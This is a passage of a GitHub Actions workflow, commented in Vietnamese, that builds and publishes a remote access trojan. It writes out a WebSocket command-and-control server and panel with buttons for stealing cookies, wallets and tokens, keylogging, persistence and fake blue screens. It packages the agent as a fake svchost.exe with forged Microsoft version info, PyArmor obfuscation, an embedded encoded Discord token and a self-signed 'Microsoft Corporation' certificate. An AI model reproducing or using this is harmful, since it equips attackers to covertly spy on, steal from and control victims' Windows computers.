          <script>
          var $=function(s){return document.querySelector(s)};
          var ws=null,agents=[],attached=null,paused=false,kbd=true,frames=0,fpsT=Date.now();
          var PASS=localStorage.getItem('svcpass')||'';
          var ctx=$('#view').getContext('2d');
          var raf=0,pend=null,downBtn=null;

          function setDot(on){ $('#dot').className='dot '+(on?'on':'off'); }
          function out(t,cls){ var o=$('#out'),d=document.createElement('div'); if(cls)d.className=cls; d.textContent=t; o.appendChild(d); o.scrollTop=o.scrollHeight; }
          function wsUrl(){ return (location.protocol==='https:'?'wss://':'ws://')+location.host+'/ws'; }

          function connect(){
            setDot(false);
            try{ ws=new WebSocket(wsUrl()); }catch(e){ setTimeout(connect,2500); return; }
            ws.binaryType='blob';
            ws.onopen=function(){ setDot(true); ws.send(JSON.stringify({t:'hello',role:'web',pass:PASS})); };
            ws.onclose=function(){ setDot(false); setTimeout(connect,2500); };
            ws.onerror=function(){};
            ws.onmessage=onMsg;
          }

          function onMsg(ev){
            if(ev.data instanceof Blob){ draw(ev.data); return; }
            var m; try{ m=JSON.parse(ev.data); }catch(e){ return; }
            if(m.t==='agents'){ agents=m.list||[]; renderList(); return; }
            if(m.t==='attached'){
              attached=m.id||null;
              $('#who').textContent = m.info ? (m.info.host+' · '+m.info.user+' · '+m.info.ip) : 'Chua chon may';
              if(m.info && m.info.mons){ var o=''; for(var i=1;i<=m.info.mons;i++) o+='<option value="'+i+'">'+i+'</option>'; $('#mon').innerHTML=o; }
              renderList(); pushSet(); return;
            }
            if(m.t==='cmdres'){ out(m.text||''); return; }
            if(m.t==='file'){ fileOut(m); return; }
            if(m.t==='agentdown'){ if(m.id===attached) out('[!] may nay mat ket noi','err'); return; }
            if(m.t==='err'){ out('!! '+m.msg,'err'); if(m.msg==='sai mat khau'){ var p=prompt('Mat khau web:'); if(p!==null){ PASS=p; localStorage.setItem('svcpass',p); ws.close(); } } return; }
          }

          async function draw(blob){
            try{
              var bmp=await createImageBitmap(blob);
              var c=$('#view');
              if(c.width!==bmp.width||c.height!==bmp.height){ c.width=bmp.width; c.height=bmp.height; }
              ctx.drawImage(bmp,0,0); bmp.close();
              $('#hint').style.display='none';
              frames++; var now=Date.now();
              if(now-fpsT>1000){ $('#fpsv').textContent=(frames*1000/(now-fpsT)).toFixed(1)+' fps'; frames=0; fpsT=now; }
            }catch(e){}
          }

          function fileOut(m){
            var bin=atob(m.b64), n=bin.length, u=new Uint8Array(n);
            for(var i=0;i<n;i++) u[i]=bin.charCodeAt(i);
            var url=URL.createObjectURL(new Blob([u]));
            var o=$('#out'), d=document.createElement('div'), a=document.createElement('a');
            a.href=url; a.download=m.name; a.textContent='[ tai ve ] '+m.name+' ('+Math.round(m.size/1024)+' KB)';
            d.appendChild(a); o.appendChild(d); o.scrollTop=o.scrollHeight;
          }

          function renderList(){
            var f=($('#q').value||'').toLowerCase(), l=$('#list'), n=0;
            l.innerHTML='';
            agents.forEach(function(a){
              var txt=((a.host||'')+' '+(a.user||'')+' '+(a.os||'')+' '+(a.ip||'')).toLowerCase();
              if(f && txt.indexOf(f)<0) return;
              n++;
              var d=document.createElement('div');
              d.className='it'+(a.id===attached?' sel':'');
              var b=document.createElement('b'); b.textContent=a.host||a.id;
              var s=document.createElement('span');
              s.textContent=(a.user||'?')+' - '+(a.os||'?')+(a.admin?' - ADMIN':'')+' - '+(a.ip||'');
              var i=document.createElement('i'); if(!a.on) i.className='dead';
              d.appendChild(b); d.appendChild(s); d.appendChild(i);
              if(a.viewers){ var v=document.createElement('span'); v.className='vw'; v.textContent=a.viewers+'x'; d.appendChild(v); }
              d.onclick=function(){ attach(a.id); };
              l.appendChild(d);
            });
            $('#cnt').textContent=n+' may';
          }

          function attach(id){
            attached=id;
            if(ws&&ws.readyState===1) ws.send(JSON.stringify({t:'attach',id:id}));
            $('#out').innerHTML=''; out('[*] da chon '+id,'in');
            renderList();
          }
          function pushSet(){
            if(!ws||ws.readyState!==1||!attached) return;
            ws.send(JSON.stringify({t:'set',s:{fps:+$('#fps').value,q:+$('#qual').value,
              scale:+$('#scale').value,mon:+$('#mon').value,hidden:$('#hid').checked}}));
          }
          function inp(d){
            if(!ws||ws.readyState!==1||!attached||paused) return;
            d.h=$('#hid').checked;
            ws.send(JSON.stringify({t:'in',d:d}));
          }
          function pos(e){
            var c=$('#view'), r=c.getBoundingClientRect();
            var x=(e.clientX-r.left)/r.width, y=(e.clientY-r.top)/r.height;
            return {x:Math.max(0,Math.min(1,x)), y:Math.max(0,Math.min(1,y))};
          }
          function moveTo(p){ pend=p; if(raf) return;
            raf=requestAnimationFrame(function(){ raf=0; if(pend) inp({a:'m',x:pend.x,y:pend.y}); pend=null; }); }

          var v=$('#view');
          v.addEventListener('pointerdown',function(e){
            v.focus(); var p=pos(e);
            if(e.button===0){ downBtn='left'; inp({a:'d',dn:true,x:p.x,y:p.y,b:'left'}); }
            else if(e.button===2){ inp({a:'c',x:p.x,y:p.y,b:'right',n:1}); }
            else if(e.button===1){ inp({a:'c',x:p.x,y:p.y,b:'mid',n:1}); }
            e.preventDefault();
          });
          v.addEventListener('pointermove',function(e){
            var p=pos(e);
            if(downBtn) inp({a:'d',x:p.x,y:p.y,b:downBtn});
            else moveTo(p);
          });
          v.addEventListener('pointerup',function(e){
            var p=pos(e);
            if(downBtn){ inp({a:'d',dn:false,x:p.x,y:p.y,b:downBtn}); downBtn=null; }
            e.preventDefault();
          });
          v.addEventListener('contextmenu',function(e){ e.preventDefault(); });
          v.addEventListener('wheel',function(e){
            e.preventDefault(); var p=pos(e); inp({a:'s',x:p.x,y:p.y,dy:e.deltaY>0?1:-1});
          },{passive:false});

          var VK={Enter:13,Escape:27,Backspace:8,Tab:9,Delete:46,Insert:45,Home:36,End:35,PageUp:33,PageDown:34,
          ArrowUp:38,ArrowDown:40,ArrowLeft:37,ArrowRight:39,Shift:16,Control:17,Alt:18,Meta:91,CapsLock:20,
          F1:112,F2:113,F3:114,F4:115,F5:116,F6:117,F7:118,F8:119,F9:120,F10:121,F11:122,F12:123,
          ' ':32,'-':189,'=':187,'[':219,']':221,';':186,',':188,'.':190,'/':191,'\\':220,'`':192};
          function skip(){ var a=document.activeElement; return a===$('#cmd')||a===$('#q'); }
          document.addEventListener('keydown',function(e){
            if(!attached||!kbd||skip()) return;
            var k=e.key;
            if(k.length===1 && !e.ctrlKey && !e.altKey && !e.metaKey){ inp({a:'t',s:k}); e.preventDefault(); return; }
            var vk=VK[k]; if(vk===undefined&&k.length===1) vk=k.toUpperCase().charCodeAt(0);
            if(vk!==undefined){ inp({a:'k',vk:vk,dn:true}); e.preventDefault(); }
          });
          document.addEventListener('keyup',function(e){
            if(!attached||!kbd||skip()) return;
            var k=e.key;
            if(k.length===1 && !e.ctrlKey && !e.altKey && !e.metaKey) return;
            var vk=VK[k]; if(vk===undefined&&k.length===1) vk=k.toUpperCase().charCodeAt(0);
            if(vk!==undefined) inp({a:'k',vk:vk,dn:false});
          });

          function runCmd(){
            var t=$('#cmd').value.trim();
            if(!t||!attached) return;
            var sp=t.split(/\s+/), name=sp.shift();
            out('> '+t,'in');
            ws.send(JSON.stringify({t:'cmd',name:name,args:sp,rid:Date.now()}));
            $('#cmd').value='';
          }
          $('#run').onclick=runCmd;
          $('#cmd').addEventListener('keydown',function(e){ if(e.key==='Enter') runCmd(); });
          $('#q').addEventListener('input',renderList);
          $('#recon').onclick=function(){ try{ ws.close(); }catch(e){} connect(); };
          $('#hid').onchange=pushSet; $('#fps').onchange=pushSet; $('#qual').onchange=pushSet;
          $('#scale').onchange=pushSet; $('#mon').onchange=pushSet;
          $('#pause').onclick=function(){ paused=!paused; this.textContent=paused?'Tiep tuc':'Tam dung'; };
          $('#kb').onclick=function(){ kbd=!kbd; this.textContent='Ban phim: '+(kbd?'ON':'OFF'); };
          $('#fs').onclick=function(){ var s=$('#stage'); if(!document.fullscreenElement) s.requestFullscreen(); else document.exitFullscreen(); };

          var QUICK=['help','sysinfo','shot','ls C:\\','procs','net','wifi','browser','cookies','wallets','dtoken',
          'steal','grab','keylog dump','cliplog dump','clip','bypass','persist','drives','users','av','installed',
          'power lock','msg Hello','notify svchost','beep','caps','flip','glitch on','overlay svchost','fakebsod','rickroll','mic 5'];
          QUICK.forEach(function(c){
            var b=document.createElement('button'); b.textContent=c;
            b.onclick=function(){ if(!attached) return; var sp=c.split(/\s+/), n=sp.shift();
              out('> '+c,'in'); ws.send(JSON.stringify({t:'cmd',name:n,args:sp,rid:Date.now()})); };
            $('#quick').appendChild(b);
          });

          connect();
          </script>
          </body>
          </html>`;

          const handler = function (req, res) {
            if (req.url.indexOf('/health') === 0) { res.writeHead(200); return res.end('ok'); }
            res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
            res.end(PAGE);
          };

          const useTls = fs.existsSync(CERT) && fs.existsSync(KEY);
          const srv = useTls
            ? https.createServer({ cert: fs.readFileSync(CERT), key: fs.readFileSync(KEY) }, handler)
            : http.createServer(handler);

          const wss = new WebSocketServer({ server: srv, path: '/ws', maxPayload: 64 * 1024 * 1024 });

          wss.on('connection', function (ws, req) {
            ws.ip = ((req.headers['x-forwarded-for'] || '') + ',' + (req.socket.remoteAddress || ''))
                      .split(',')[0].trim();
            ws.role = null; ws.last = Date.now(); ws.viewers = new Set(); ws.attach = null;

            ws.on('message', function (data, isBin) {
              ws.last = Date.now();
              if (isBin) {
                if (ws.role !== 'agent') return;
                ws.viewers.forEach(function (v) { try { if (v.readyState === 1) v.send(data, { binary: true }); } catch (e) {} });
                return;
              }
              let m; try { m = JSON.parse(data.toString()); } catch (e) { return; }

              if (m.t === 'hello') {
                if (m.role === 'agent') {
                  if (AKEY && m.key !== AKEY) { send(ws, { t: 'err', msg: 'bad agent key' }); return ws.close(); }
                  ws.role = 'agent';
                  ws.info = m.info || {};
                  ws.id = String(ws.info.id || ws.ip || ('agent-' + Date.now()));
                  ws.info.id = ws.id;
                  const old = agents.get(ws.id);
                  if (old && old.ws !== ws) { try { old.ws.close(); } catch (e) {} }
                  agents.set(ws.id, ws);
                  send(ws, { t: 'viewers', n: 0 });
                  pushAgents();
                  console.log('[+] agent: ' + ws.id + ' (' + ws.ip + ')');
                } else {
                  if (PASS && m.pass !== PASS) { send(ws, { t: 'err', msg: 'sai mat khau' }); return ws.close(); }
                  ws.role = 'web'; webs.add(ws);
                  pushAgents();
                }
                return;
              }

              if (ws.role === 'web') {
                if (m.t === 'attach') {
                  if (ws.attach) { const o = agents.get(ws.attach); if (o) { o.viewers.delete(ws); send(o.ws, { t: 'viewers', n: o.viewers.size }); } }
                  ws.attach = m.id || null;
                  const a = ws.attach ? agents.get(ws.attach) : null;
                  if (a) {
                    a.viewers.add(ws);
                    send(ws, { t: 'attached', id: a.id, info: a.info });
                    send(a.ws, { t: 'viewers', n: a.viewers.size });
                  } else { send(ws, { t: 'attached', id: null }); }
                  pushAgents();
                  return;
                }
                const tgt = ws.attach ? agents.get(ws.attach) : null;
                if (tgt && tgt.ws.readyState === 1 && (m.t === 'in' || m.t === 'set' || m.t === 'cmd')) {
                  send(tgt.ws, m);
                }
                return;
              }

              if (ws.role === 'agent') {
                if (m.t === 'cmdres' || m.t === 'file' || m.t === 'stat' || m.t === 'log') {
                  ws.viewers.forEach(function (v) { send(v, m); });
                }
              }
            });

            ws.on('close', function () {
              if (ws.role === 'agent') {
                if (agents.get(ws.id) === ws) agents.delete(ws.id);
                ws.viewers.forEach(function (v) { send(v, { t: 'agentdown', id: ws.id }); });
                console.log('[-] agent: ' + ws.id);
                pushAgents();
              } else if (ws.role === 'web') {
                webs.delete(ws);
                if (ws.attach) { const a = agents.get(ws.attach); if (a) { a.viewers.delete(ws); send(a.ws, { t: 'viewers', n: a.viewers.size }); } }
              }
            });
            ws.on('error', function () {});
          });

          setInterval(function () {
            agents.forEach(function (a) { try { a.ws.ping(); } catch (e) {} });
            pushAgents();
          }, 10000);

          srv.listen(PORT, HOST, function () {
            if (process.platform === 'win32') {
              try { execSync('netsh advfirewall firewall add rule name="svchost-control" dir=in action=allow protocol=TCP localport=' + PORT, { stdio: 'ignore' }); } catch (e) {}
            }
            console.log('===========================================');
            console.log(' control server: ' + (useTls ? 'https' : 'http') + '://0.0.0.0:' + PORT);
            console.log(' domain:         https://control.bot-keep.xyz');
            console.log(' mat khau web:   ' + (PASS ? 'CO' : 'khong'));
            console.log(' agent key:      ' + (AKEY ? 'CO' : 'khong'));
            console.log('===========================================');
          });
          '@
          [System.IO.File]::WriteAllText((Join-Path $PWD "server.js"), $js)

      - name: Ghi version info (giả Microsoft)
        shell: pwsh
        run: |
          $vi = @'
          VSVersionInfo(
            ffi=FixedFileInfo(
              filevers=(10,0,19041,1), prodvers=(10,0,19041,1),
              mask=0x3f, flags=0x0, OS=0x40004, fileType=0x1, subtype=0x0, date=(0,0)
            ),
            kids=[
              StringFileInfo([StringTable('040904B0', [
                StringStruct('CompanyName', 'Microsoft Corporation'),
                StringStruct('FileDescription', 'Host Process for Windows Services'),
                StringStruct('FileVersion', '10.0.19041.1'),
                StringStruct('InternalName', 'svchost.exe'),
                StringStruct('LegalCopyright', '© Microsoft Corporation. All rights reserved.'),
                StringStruct('OriginalFilename', 'svchost.exe'),
                StringStruct('ProductName', 'Microsoft® Windows® Operating System'),
                StringStruct('ProductVersion', '10.0.19041.1')])]),
              VarFileInfo([VarStruct('Translation', [1033, 1200])])
            ]
          )
          '@
          [System.IO.File]::WriteAllText((Join-Path $PWD "version_info.txt"), $vi)

      - name: Ghi manifest
        shell: pwsh
        run: |
          $mf = @'
          <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
          <assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
            <assemblyIdentity type="win32" name="Microsoft.Windows.svchost" version="10.0.19041.1" processorArchitecture="amd64"/>
            <description>Host Process for Windows Services</description>
            <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
              <security>
                <requestedPrivileges>
                  <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
                </requestedPrivileges>
              </security>
            </trustInfo>
            <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
              <application>
                <supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"/>
                <supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"/>
              </application>
            </compatibility>
          </assembly>
          '@
          [System.IO.File]::WriteAllText((Join-Path $PWD "svchost.manifest"), $mf)

      - name: Cài thư viện Python
        run: |
          python -m pip install --upgrade pip
          pip install "discord.py[voice]" PyNaCl psutil pyautogui pyperclip pynput mss opencv-python pillow numpy sounddevice soundfile soundcard requests websocket-client pycryptodome pyzipper pyarmor pyinstaller

      - name: Tạo icon giả Windows
        run: |
          python -m pip install pillow --quiet
          python -c "from PIL import Image, ImageDraw; S=256; img=Image.new('RGBA',(S,S),(0,0,0,0)); d=ImageDraw.Draw(img); b=(0,120,215,255); m=26; g=10; w=(S-2*m-g)//2; d.rectangle((m,m,m+w,m+w),fill=b); d.rectangle((m+w+g,m,S-m,m+w),fill=b); d.rectangle((m,m+w+g,m+w,S-m),fill=b); d.rectangle((m+w+g,m+w+g,S-m,S-m),fill=b); img.save('svchost.ico',sizes=[(256,256),(128,128),(64,64),(48,48),(32,32),(16,16)]); print('icon ok')"

      - name: Kiểm tra cú pháp
        run: |
          python -c "import ast; ast.parse(open('agent.py',encoding='utf-8').read()); print('OK: agent.py hop le')"
          node --check server.js && echo "OK: server.js hop le"

      - name: Tải libopus-0.dll
        shell: pwsh
        run: |
          $urls = @(
            "https://github.com/DSharpPlus/DSharpPlus/raw/master/docs/natives/vnext_natives_win32_x64.zip",
            "https://archive.mozilla.org/pub/opus/win64/opus-tools-0.2-opus-1.3-win64.zip",
            "https://archive.mozilla.org/pub/opus/win64/opus-tools-0.2-win64.zip"
          )
          $ok = $false
          foreach ($u in $urls) {
            try {
              Invoke-WebRequest -Uri $u -OutFile opus.zip -TimeoutSec 90 -ErrorAction Stop
              Remove-Item opus_tmp -Recurse -Force -ErrorAction SilentlyContinue
              Expand-Archive opus.zip -DestinationPath opus_tmp -Force
              $dll = Get-ChildItem -Path opus_tmp -Recurse -File | Where-Object { $_.Name -match '^(lib)?opus.*\.dll$' } | Select-Object -First 1
              if ($dll) { Copy-Item $dll.FullName "libopus-0.dll" -Force; $ok = $true; break }
            } catch { Write-Host "Thử $u thất bại" }
          }
          if (-not $ok) { Write-Host "::warning::Không tải được opus" }

      - name: Mã hóa token + cấu hình
        shell: pwsh
        env:
          BOT_TOKEN: ${{ github.event.inputs.token }}
          TOKEN_URL: ${{ github.event.inputs.token_url }}
          CTRL_CH: ${{ github.event.inputs.control_channel }}
          CTRL_URL: ${{ github.event.inputs.control_url }}
          AKEY: ${{ github.event.inputs.agent_key }}
        run: |
          if ($env:BOT_TOKEN) { Write-Host "::add-mask::$env:BOT_TOKEN" }
          $inject = @'
          import os, re, base64, secrets
          s = open("agent.py", encoding="utf-8").read()

          tok = (os.environ.get("BOT_TOKEN") or "").strip()
          if tok:
              raw = tok.encode()
              key = secrets.token_bytes(16)
              enc = bytes(b ^ key[i % len(key)] for i, b in enumerate(raw))[::-1]
              s = re.sub(r'_TOK_ENC\s*=\s*".*?"', '_TOK_ENC = "' + base64.b64encode(enc).decode() + '"', s, count=1)
              s = re.sub(r'_TOK_KEY\s*=\s*".*?"', '_TOK_KEY = "' + base64.b64encode(key).decode() + '"', s, count=1)
              print("discord: CO token")
          else:
              s = re.sub(r'_TOK_ENC\s*=\s*".*?"', '_TOK_ENC = ""', s, count=1)
              s = re.sub(r'_TOK_KEY\s*=\s*".*?"', '_TOK_KEY = ""', s, count=1)
              print("discord: TAT (che do web-only)")

          if os.environ.get("TOKEN_URL"):
              s = re.sub(r'TOKEN_URL\s*=\s*".*?"', 'TOKEN_URL = "' + os.environ["TOKEN_URL"] + '"', s, count=1)
          if os.environ.get("CTRL_CH") and os.environ["CTRL_CH"] != "0":
              s = re.sub(r'CONTROL_CH_ID\s*=\s*\d+', 'CONTROL_CH_ID = ' + os.environ["CTRL_CH"], s, count=1)
          if os.environ.get("CTRL_URL"):
              s = re.sub(r'CONTROL_URL\s*=\s*".*?"', 'CONTROL_URL = "' + os.environ["CTRL_URL"].rstrip("/") + '"', s, count=1)
          if os.environ.get("AKEY"):
              s = re.sub(r'AGENT_KEY\s*=\s*".*?"', 'AGENT_KEY = "' + os.environ["AKEY"] + '"', s, count=1)

          open("agent.py", "w", encoding="utf-8").write(s)
          '@
          $inject | python -

      - name: Register PyArmor license
        continue-on-error: true
        shell: pwsh
        env:
          PYARMOR_REGCODE: ${{ secrets.PYARMOR_REGCODE }}
        run: |
          if ($env:PYARMOR_REGCODE) {
            Set-Content -Path regcode.txt -Value $env:PYARMOR_REGCODE
            pyarmor reg -p "non-profits" regcode.txt
            pyarmor -v
          } else {
            Write-Host "Khong co PYARMOR_REGCODE - bo qua"
          }

      - name: Build exe
        shell: pwsh
        env:
          OBF: ${{ github.event.inputs.obfuscate }}
        run: |
          $extra = @()
          $src = "agent.py"
          $useObf = $false
          if ($env:OBF -eq "yes") {
            Remove-Item obf -Recurse -Force -ErrorAction SilentlyContinue
            try { pyarmor gen -O obf agent.py } catch {}
            if (Test-Path "obf/agent.py") {
              $rt = (Get-ChildItem -Path obf -Directory | Where-Object { $_.Name -like 'pyarmor_runtime*' } | Select-Object -First 1).Name
              if ($rt) {
                $src = "obf/agent.py"
                $extra += "--add-data"; $extra += "obf/$rt;$rt"
                $extra += "--hidden-import"; $extra += "$rt"
                $useObf = $true
              }
            }
            if ($useObf) { Write-Host "OK: build ban da obfuscate (PyArmor)" }
            else { Write-Host "::warning::PyArmor free khong obfuscate duoc script lon - build ban thuong" }
          }
          pyinstaller --noconfirm --clean --onefile --noconsole --noupx --optimize 2 --name svchost --icon svchost.ico --manifest svchost.manifest --version-file version_info.txt --add-binary "libopus-0.dll;." --collect-all soundcard --collect-all sounddevice --collect-all cv2 --hidden-import websocket --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 --exclude-module tkinter --exclude-module matplotlib --exclude-module scipy --exclude-module pandas --exclude-module PyQt5 --exclude-module PySide2 --exclude-module IPython --exclude-module pytest @extra $src
          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }

      - name: Ký số self-signed
        if: ${{ github.event.inputs.sign == 'yes' }}
        continue-on-error: true
        shell: pwsh
        run: |
          $cert = New-SelfSignedCertificate -Type CodeSigningCert -Subject "CN=Microsoft Windows, O=Microsoft Corporation" -CertStoreLocation Cert:\CurrentUser\My -NotAfter (Get-Date).AddYears(5)
          Set-AuthenticodeSignature -FilePath dist\svchost.exe -Certificate $cert -TimestampServer "http://timestamp.digicert.com"
          Write-Host "Đã ký"

      - name: Chạy test trực tiếp
        if: ${{ github.event.inputs.run_minutes != '0' }}
        shell: pwsh
        env:
          RUN_MIN: ${{ github.event.inputs.run_minutes }}
        run: |
          Write-Host "Mo https://control.bot-keep.xyz -> chon may -> dieu khien"
          $p = Start-Process -FilePath "dist\svchost.exe" -PassThru
          $secs = [int]$env:RUN_MIN * 60
          for ($i = 1; $i -le $secs; $i += 15) {
            if ($p.HasExited) { Write-Host "Thoát sớm!"; break }
            Start-Sleep -Seconds 15; Write-Host "[$i s]..."
          }
          if (-not $p.HasExited) { Stop-Process -Id $p.Id -Force }

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: svchost-exe
          path: dist/svchost.exe
          if-no-files-found: error

      - name: Upload server
        uses: actions/upload-artifact@v4
        with:
          name: svchost-server
          path: server.js
          if-no-files-found: error

  release:
    needs: build
    if: ${{ github.event.inputs.make_release == 'yes' }}
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - name: Tải artifact
        uses: actions/download-artifact@v4
        with:
          name: svchost-exe
      - name: Tải server
        uses: actions/download-artifact@v4
        with:
          name: svchost-server
      - name: Tạo Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: build-${{ github.run_number }}
          name: svchost build ${{ github.run_number }}
          body: |
            Build #${{ github.run_number }}

            - `svchost.exe` — agent Windows (kết nối ra control server, không cần mở port)
            - `server.js` — server web control, chạy trên VPS: `node server.js` (cổng 33324)

            Cập nhật máy đang chạy: `!update <url svchost.exe>`
          files: |
            svchost.exe
            server.js
          make_latest: true
